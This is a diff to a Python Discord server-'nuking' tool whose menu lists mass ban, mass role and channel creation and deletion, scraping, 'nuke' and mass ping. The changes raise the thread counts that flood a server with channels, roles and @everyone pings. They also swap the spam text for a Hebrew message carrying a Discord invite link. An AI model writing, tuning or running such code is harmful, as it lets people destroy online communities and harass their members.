@@ -62,12 +62,12 @@ menu_logo = f'''
                         \033[38;5;219m      ░     ░ ░   ░   ░      ░ ░  
                                   '''
 menu_opt = '''              
-                  ╔═══════════════════════════════════════════════╗
-                  |[1]  mass ban         [2]  mass role           |
-                  |[3]  mass role delete [4]  scrape              |
-                  |[5]  mass chanels     [6]  mass chanels delete |
-                  |[7]  nuke             [8]  mass ping           |
-                  ╚═══════════════════════════════════════════════╝''' 
+                ╔═════════════════════════════════════════════════╗
+                |[1]  mass ban         [2]  mass role             |
+                |[3]  mass role delete [4]  scrape                |
+                |[5]  mass channels    [6]  mass channels delete  |
+                |[7]  nuke             [8]  mass ping             |
+                ╚═════════════════════════════════════════════════╝''' 
 if name == 'nt':
   _ = system('cls')
   os.system(f'cls & mode 85,20 ')
@@ -217,7 +217,7 @@ async def threds_mass_webhook_spam():
         w.close() """
 ###############################################################
 def mass_bot_pings(msg, chan_id):
-  spaming = ['@everyone vilont owns me', msg, msg, msg]
+  spaming = ['@everyone אם ניוקר זה שומש לרעה ובלי סיבה מוזמנים לפנות אילנו https://discord.gg/wJEav7g773', msg, msg, msg]
   json = {
     'content': random.choice(spaming),
     "tts": False,
@@ -307,12 +307,12 @@ async def nuke():
       for role in roles_ids:
         threads = []
         trd = threading.Thread(target=mass_role_delete, args=[role]).start()   
-    for i in range(300):
+    for i in range(430):
       tr = threading.Thread(target=mass_chanels, args=[channels_name]).start()
-    for i in range(200):
+    for i in range(230):
       tr = threading.Thread(target=mass_role, args=[role_name]).start()
-    for i in range(20):
-      channel_ids = open('itadori/channels.txt', 'r')
+    for i in range(130):
+      channel_ids = open('gojo/channels.txt', 'r')
       chan_idss = channel_ids.read().split()
       await Scrape_ping()
       for chan_id in list(chan_idss):
